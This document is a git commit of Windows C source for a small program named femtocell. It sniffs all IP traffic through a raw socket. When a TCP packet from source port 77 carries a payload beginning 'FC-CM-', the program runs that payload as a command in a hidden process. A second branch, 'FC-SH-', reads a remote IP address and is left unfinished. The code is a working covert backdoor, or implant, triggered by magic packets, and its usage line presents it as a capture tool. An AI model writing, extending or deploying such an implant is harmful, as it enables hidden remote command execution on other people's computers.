691ea9733239f430e16396e4055d5bd6ef7b7259
d3adzo <enzo.destephano@gmail.com>
2022-10-15 17:50:04 -0400

    first commit

---
+++ femtocell.c
@@ -0,0 +1,116 @@
+#include "femtocell.h"
+
+void execCmd(char* cmd)
+{
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	// Start the child process. 
+	if (!CreateProcessA(NULL,   // No module name (use command line)
+		cmd,        // Command line
+		NULL,           // Process handle not inheritable
+		NULL,           // Thread handle not inheritable
+		FALSE,          // Set handle inheritance to FALSE
+		CREATE_NO_WINDOW,              // No creation flags
+		NULL,           // Use parent's environment block
+		NULL,           // Use parent's starting directory 
+		&si,            // Pointer to STARTUPINFO structure
+		&pi)           // Pointer to PROCESS_INFORMATION structure
+		)
+	{
+		printf("CreateProcess failed (%d).\n", GetLastError());
+		return;
+	}
+
+	// Wait until child process exits.
+	WaitForSingleObject(pi.hProcess, INFINITE);
+
+	// Close process and thread handles. 
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+}
+
+int main(int argc, char** argv) {
+	if (argc != 3) {
+		fprintf(stderr, "usage: %s <interface-ip> <capture-file>\n", argv[0]);
+		exit(-1);
+	}
+
+	WSADATA wsaData;
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+
+	SOCKET sd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+	if (sd == INVALID_SOCKET) {
+		fprintf(stderr, "socket() failed: %u", WSAGetLastError());
+		exit(-1);
+	}
+
+	struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = inet_addr(argv[1]);
+	addr.sin_port = htons(0);
+
+	int rc = bind(sd, (struct sockaddr*)&addr, sizeof(addr));
+	if (rc == SOCKET_ERROR) {
+		fprintf(stderr, "bind() failed: %u", WSAGetLastError());
+		exit(-1);
+	}
+
+	int value = RCVALL_IPLEVEL;
+	DWORD out = 0;
+	rc = WSAIoctl(sd, SIO_RCVALL, &value, sizeof(value), NULL, 0, &out, NULL, NULL);
+	if (rc == SOCKET_ERROR) {
+		fprintf(stderr, "WSAIoctl() failed: %u", WSAGetLastError());
+		exit(-1);
+	}
+
+	unsigned char buffer[BUFFER_SIZE_ETH + BUFFER_SIZE_PKT];
+	memset(buffer, 0, sizeof(buffer));
+	buffer[BUFFER_OFFSET_ETH + 12] = 0x08;
+
+	while (1) {
+		int rc = recv(sd, (char*)buffer + BUFFER_OFFSET_IP, BUFFER_SIZE_IP, 0);
+		if (rc == SOCKET_ERROR) {
+			fprintf(stderr, "recv() failed: %u", WSAGetLastError());
+			exit(-1);
+		}
+
+		struct ip_hdr_s* ip_header = (buffer+BUFFER_OFFSET_IP);
+		uint8_t l4_protocol = ip_header->ip_p;
+		if (l4_protocol == 6) // TCP
+		{
+			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
+			uint16_t sport = ntohs(tcp_header->th_sport);
+			if (sport == 77)
+			{
+
+				uint16_t flag = (uint16_t)tcp_header->th_flags;
+				BOOL push = (flag >> 3) % 2;
+				if (push) {
+					char* data = (char*)(buffer + BUFFER_OFFSET_DATA);
+					int buffoffdata = BUFFER_SIZE_TCP;
+					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
+					data[payloadLength - 1] = '\0';
+
+					if (payloadLength > 6 && strncmp(data, "FC-SH-", 6) == 0)
+					{
+						char* rip = (char*)data + 6;
+					}
+					else if (payloadLength > 6 && strncmp(data, "FC-CM-", 6) == 0)
+					{
+						char* cmd = (char*)data + 6;
+						execCmd(cmd);
+					}
+				}
+			}
+		}
+		
+	}
+	return 0;
+}
+
---
+++ femtocell.h
@@ -0,0 +1,50 @@
+#pragma once
+
+#include <errno.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <winsock2.h>
+#include <mstcpip.h>
+#include <iphlpapi.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+
+struct tcp_hdr_s {
+	unsigned short int th_sport;
+	unsigned short int th_dport;
+	unsigned int th_seq;
+	unsigned int th_ack;
+	unsigned char th_x2 : 4, th_off : 4;
+	unsigned char th_flags;
+	unsigned short int th_win;
+	unsigned short int th_sum;
+	unsigned short int th_urp;
+} tcp_hdr_t;
+
+
+struct ip_hdr_s {
+	uint8_t  ip_hl : 4, /* both fields are 4 bits */
+		ip_v : 4;
+	uint8_t        ip_tos;
+	uint16_t       ip_len;
+	uint16_t       ip_id;
+	uint16_t       ip_off;
+	uint8_t        ip_ttl;
+	uint8_t        ip_p;
+	uint16_t       ip_sum;
+	uint32_t ip_src;
+	uint32_t ip_dst;
+}ip_hdr_t;
+
+
+#define BUFFER_SIZE_PKT ((256*256) - 1)
+#define BUFFER_SIZE_ETH 14
+#define BUFFER_SIZE_IP (BUFFER_SIZE_PKT - BUFFER_SIZE_ETH)
+#define BUFFER_SIZE_TCP sizeof(struct tcp_hdr_s)
+
+#define BUFFER_OFFSET_ETH 16
+#define BUFFER_OFFSET_IP (BUFFER_OFFSET_ETH + BUFFER_SIZE_ETH)
+#define BUFFER_OFFSET_L4 ( BUFFER_OFFSET_IP + sizeof(struct ip_hdr_s) )
+#define BUFFER_OFFSET_DATA ( BUFFER_OFFSET_L4 + sizeof(struct tcp_hdr_s) )
